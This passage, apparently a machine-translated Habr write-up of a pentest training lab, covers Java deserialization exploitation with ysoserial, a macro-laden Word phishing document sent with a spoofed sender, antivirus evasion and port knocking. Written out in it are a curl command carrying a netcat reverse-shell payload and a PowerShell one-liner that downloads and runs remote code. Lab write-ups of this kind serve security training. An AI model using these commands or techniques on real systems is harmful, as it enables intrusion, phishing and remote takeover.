inherit;">page of vacations and new credentials: </font><font style="vertical-align: inherit;">Trying to log in or pick up a password for a.petrov's login - without success. Then pay attention to cookies: </font></font><br><br><img src="https://habrastorage.org/files/329/5ba/bea/3295babeaf16499197a063c036a66eb4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Looks like base64, decode: </font></font><br><br><img src="https://habrastorage.org/files/6a7/5c0/ff2/6a75c0ff2b6849aea691b6de9dbdaf08.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">This is a Java object that stores the username and hash of his password in the form of md5. Trying to "slip" the name a.petrov - does not work. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Once the object arrives at the client and then is restored on the server, try to dig in this direction.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">While restoring an object from the base64 string to a binary format and then into memory (deserialization), there is the </font></font><a href="http://frohoff.github.io/appseccali-marshalling-pickles/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">recently demonstrated ability to</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> execute arbitrary code. Such a vulnerability was, for example, in Jenkins. For operation, we try to use the utility </font></font><a href="https://github.com/frohoff/ysoserial/releases"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ysoserial</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After reading the instructions, it becomes clear that it is possible to execute an arbitrary command on the server using the utility. It generates a Java object, which then during deserialization will execute </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the command we need (namely, the reverse shell, in our case). </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We write a small command to conveniently send the content generated by the ysoserial in the form of a base64-cookie to bash: An </font></font><br><br> <code>curl -b 'userInfo="'$(java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nc -e /bin/sh 172.16.0.2 1235' | base64 | tr -d '\n')'"' 'http://192.168.1.2:8080/index.jsp'</code> <br> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">error occurs during execution: </font></font><br><br><img src="https://habrastorage.org/files/038/f05/aa6/038f05aa6e924f9e9ed14adca4d36484.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We find the same problem right on</font></font><a href="https://github.com/frohoff/ysoserial/issues/17"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">githabe developer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It has already been fixed in the repository, but not yet compiled in release. </font><font style="vertical-align: inherit;">We clone a new version with github, install maven and build it locally: </font><font style="vertical-align: inherit;">Get the file we need! </font><font style="vertical-align: inherit;">Update the command to the new payload Commons-Collections5: </font><font style="vertical-align: inherit;">On the ssh server, as usual, we run netcat, which listens on port 1235, and we launch the following: The </font><font style="vertical-align: inherit;">long-awaited shell. </font><font style="vertical-align: inherit;">Find token.txt in the root folder: </font><font style="vertical-align: inherit;">And one more token yielded! </font><font style="vertical-align: inherit;">Having studied a little portal, we find something interesting in the crontab: </font><font style="vertical-align: inherit;">Mail check script! </font><font style="vertical-align: inherit;">Let's see what's in it. </font><font style="vertical-align: inherit;">B.muncy name and password in the mail! </font><font style="vertical-align: inherit;">So we got close to the task mail.</font></font><br><br> <code>apt-get install maven <br> git clone https://github.com/frohoff/ysoserial.git <br> mvn compile package <br></code> <br><font style="vertical-align: inherit;"></font><br><br><img src="https://habrastorage.org/files/79f/372/69b/79f37269b3a44cdd8e3dc360a3ce22f3.png"><br><br><font style="vertical-align: inherit;"></font><br><br> <code>curl -b 'userInfo="'$(java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 'nc -e /bin/sh 172.16.0.2 1235' | base64 | tr -d '\n')'"' 'http://192.168.1.2:8080/index.jsp'</code> <br> <br><font style="vertical-align: inherit;"></font><br><br><img src="https://habrastorage.org/files/8eb/294/279/8eb29427922845d1a95ed956e65a081e.png"><br><br><font style="vertical-align: inherit;"></font><br><br><img src="https://habrastorage.org/files/54d/b62/d2b/54db62d2b4514a56b7cc9267bc7047a0.png"><br><br><font style="vertical-align: inherit;"></font><br><br><font style="vertical-align: inherit;"></font><br><br><img src="https://habrastorage.org/files/e58/d3c/f5e/e58d3cf5e28e4eeb9002a5079bdc35c5.png"><br><br><font style="vertical-align: inherit;"></font><br><br><img src="https://habrastorage.org/files/700/4b2/9b1/7004b29b155c40b9bc693cda61bb55d0.png"><br><br><font style="vertical-align: inherit;"></font><br><br><h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Roundcube Mail </font></font></h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The laboratory uses the Roundcube server, in which there were many vulnerabilities, but in this version all known ones have already been fixed. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Let's try the other side. We go in the mail with a password from b.muncy: </font></font><br><br><img src="https://habrastorage.org/files/e07/664/c00/e07664c00d2e48c79f0b1a360698d6e9.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The mailbox is empty. But, since there was a robot on the portal that automatically checked mail, we‚Äôll try to send messages to other accounts that we already learned. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">One of them - r.diaz - answers letters! We are trying to send him something else. </font></font><br><br><img src="https://habrastorage.org/files/a37/551/02d/a3755102d629404c8dbec4e2446d02c2.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And we get the answer: </font></font><br><br><img src="https://habrastorage.org/files/d5b/d31/aeb/d5bd31aeb1df44f9ba03090272fdc553.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After talking with the bot, it becomes clear that social engineering needs to be applied. We try to send the bot different files: PDF, Word-documents and so on. And so, the bot responds to one of these shipments!</font></font><br><br><img src="https://habrastorage.org/files/fc9/1e8/936/fc91e8936d004b0191356449e9258fa4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If you send a Word document in an attachment, it issues a token and a message stating that such files can be opened only if they come from r.lampman. </font><font style="vertical-align: inherit;">Let's try to do it!</font></font><br><br><h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Terminal </font></font></h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">On the terminal server, port 3389 for rdp is closed, and there is nothing interesting in the rest. </font><font style="vertical-align: inherit;">Where, no matter how there, r.diaz hid and opens Word-documents! </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I made the assumption that Microsoft Security Essentials was installed on the terminal server, as it was on terminal2, and installed Windows locally with the same antivirus to test on the spot before sending the document. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The attack, in this case, turns out to be multistage. </font><font style="vertical-align: inherit;">To get a session at the terminal, we need:</font></font><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> learn how to send r.diaz letters from r.lampman (we don‚Äôt have his password to the mail), </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> create a document with reverse shell payload, </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> bypass Microsoft Security Essentials antivirus, </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> enable the listener on your computer on port 443 (only 80 and 443 are open from inside the network). </font></font></li></ul><br><h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sending letters </font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Let's try to write a script that will automatically send r.diaz letters on behalf of r.lampman using the password b.muncy. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For this we will substitute the desired address in the FROM field: </font></font><br><br><img src="https://habrastorage.org/files/f15/671/c5c/f15671c5c99e45b2ab4e7fc08ad0ce8b.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here a few things are important:</font></font><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> replace the value of the FROM field with the desired one </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> substitute the correct MIME type so that it is clear that the Word document is being sent </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Do not forget to encode the document in base64 so that it does not deteriorate during transmission, </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> forward port 587 from 172.16.0.1 to the local machine: </font></font><br><img src="https://habrastorage.org/files/bde/379/724/bde37972442a4ce99df2be7cf0e62645.png"></li></ul><br><br><h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> We form payload </font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now you need to create a Word document that is not detected by antivirus as infected. After many unsuccessful attempts (it is convenient to test in your environment before a real attack), it turned out to work out a working version. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We will not save the entire payload immediately to the document, but make it so that it downloads it from our server. To do this, we will do the following: </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. Use setoolkit to create payload:</font></font></i> <br><br><img src="https://habrastorage.org/files/cae/6b8/2f1/cae6b82f1779405283e108a2c5cea4f9.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> select option 1 (Social-Engineering Attacks), then 9 (Powershell Attack Vectors) and then 1 (Powershell Alphanumeric Shellcode Injector): Start the </font></font><br><br><img src="https://habrastorage.org/files/85c/dcb/36e/85cdcb36e26e4e0d8470e15d5f471d94.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">web server on the local machine and copy the received payload from /root/.set/reports/powershell to /var/www/html/payload.txt: </font></font><br><br><img src="https://habrastorage.org/files/742/8d1/b99/7428d1b99de9445ea26ecb0dcff1ca03.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Check that the file is available: </font></font><br><br><img src="https://habrastorage.org/files/a56/4e1/2b9/a564e12b96d0493bb183603c70d17b6b.png"><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. Create a document</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I used this launch option described in this </font></font><a href="http://null-byte.wonderhowto.com/how-to/create-obfuscate-virus-inside-microsoft-word-document-0167780/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As shown, we need to obfuscate the loadload payload command: </font></font><br> <code>powershell.exe "IEX ((new-object net.webclient).downloadstring('http://&lt;your_ip&gt;/payload.txt'))"</code> <br> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To do this, you can use the Java applet from the article available </font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font> Run: <br><br><img src="https://habrastorage.org/files/4ae/925/e93/4ae925e930da42078daecbc8744303db.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enter: </font></font><br> <code>powershell.exe "IEX ((new-object net.webclient).downloadstring('http://&lt;your_pentestit_ip&gt;/payload.txt'))"</code> <br> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get the result and insert into the document. </font><font style="vertical-align: inherit;">I added Document_Open () just in case. </font></font><br><br><img src="https://habrastorage.org/files/9f9/0e9/0d5/9f90e90d5c3b4752b2140d9c3a46bf7a.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When adding a macro, it is important to save it in the document, and not in the Normal template. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Save the document with the docm extension, put it in the daddy with the senddoc.py script, and now the last step remains. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. Launch Metasploit</font></font></i> <br><br><img src="https://habrastorage.org/files/ba5/087/27d/ba508727d2c8418bbf00e6027b1ec996.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Before launch, we once again go through a small ‚Äúchecklist‚Äù:</font></font><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload is available at </font></font><a href="http://your_ip/payload.txt"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">your_ip / payload.txt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> port 587 with 172.16.0.1 is forwarded to the local 127.0.0.1, </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> The document is located in the folder along with the script for sending mail. </font></font></li></ul><br>  Run! <br><br><img src="https://habrastorage.org/files/31b/e13/897/31be138975da424eb5126e8d932c6133.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And in a minute: </font></font><br><br><img src="https://habrastorage.org/files/266/8f0/915/2668f09156eb4052bc5b56db5a8d2325.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Go to C: \ Users \ r.diaz \ Desktop and get a token!</font></font><br><br><img src="https://habrastorage.org/files/c96/617/44a/c9661744a72449dda8fd9017586bfb70.png"><br><br><h1><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> SSH-TEST - the last barrier </font></font></h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It remains the last server, on which so far we have not found any leads in the network. Having scanned all its ports, we determine that none of them is responding. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">At the same time, all but three respond to us with RST packets (closed), and 3 simply discard all packets arriving at them. </font></font><br><br><img src="https://habrastorage.org/files/660/609/fa3/660609fa3b5a40418f7dcd4f08d49b6f.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">This suggests that these ports need to be ‚Äúknocked‚Äù in the hope that port 22 (ssh) will open with the right combination for a moment, in which we will have time to connect to it. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">By the way, at the very beginning of the passage on the ssh server we found the key in the .ssh folder of the user d.nash: </font></font><br><br><img src="https://habrastorage.org/files/831/914/2a7/8319142a7c3b49868f265e3151a660e8.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For sure it will be useful to us here. So, in order to knock on the desired port, do the following: </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Start sshuttle to go to the server directly:</font></font><br><br><img src="https://habrastorage.org/files/17a/9b3/afa/17a9b3afa15f4eaf8d851761a3781cdd.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It is convenient to specify the desired subnet to remain Internet access. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Copy the d.nash id_rsa key to your disk: </font></font><br><br><img src="https://habrastorage.org/files/b83/4e3/8b5/b834e38b5cdf4590b01f6655655a4b6f.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Install the knock utility, which will knock on the necessary ports: </font></font><br><br><img src="https://habrastorage.org/files/59f/22a/4b5/59f22a4b5fc445379408c47742006de1.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Try 6 combinations of these three ports, and one of them works! </font></font><br><br><img src="https://habrastorage.org/files/4b0/b67/894/4b0b67894dde432bb34d33ce77e60efe.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here is the last token! Lab passed.</font></font><br><br><h1>  Afterword </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">This document describes just one way to go through the lab. </font><font style="vertical-align: inherit;">I am sure that there are a lot of options. </font><font style="vertical-align: inherit;">If you know some interesting way to solve this or that problem, which I did not mention here, I will be glad to know about it in the comments. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I hope that this article will help those who have not worked with Pentest to plunge into the world of information security and try themselves in real practical testing. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The laboratory will be available until November, so there will be enough time for training, and this writeup will help to start. </font><font style="vertical-align: inherit;">Do not give up in the process, and as they say: Try Harder.</font></font><br><br>  Good luck! </div><p>Source: <a href="https://habr.com/ru/post/303700/">https://habr.com/ru/post/303700/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../303688/index.html">Lecture 3 out of 10. Work Growth Team (Growth Team)</a></li>
<li><a href="../303692/index.html">Oracle cloud services for IT monitoring</a></li>
<li><a href="../303694/index.html">Our rake in launching a hardware startup is searching for a business model and developing MVP in the field of ‚ÄúInternet of Things‚Äù</a></li>
<li><a href="../303696/index.html">Integrated Design with EMC Capital Projects and AVEVA NET Workhub and Dashboard</a></li>
<li><a href="../303698/index.html">How to build a random number sensor with human participation?</a></li>
<li><a href="../303702/index.html">Dream job and free cluster on 1 million meta data</a></li>
<li><a href="../303706/index.html">The teams for Euro 2016: a comparison of European football leagues</a></li>
<li><a href="../303708/index.html">A hundred oldies can be thrown out</a></li>
<li><a href="../303710/index.html">Application on API hh.ru. We recommend vacancies for your resume</a></li>
<li><a href="../303712/index.html">Edsger Dijkstra: in search of the ‚Äúshortest path‚Äù to conscious programming</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>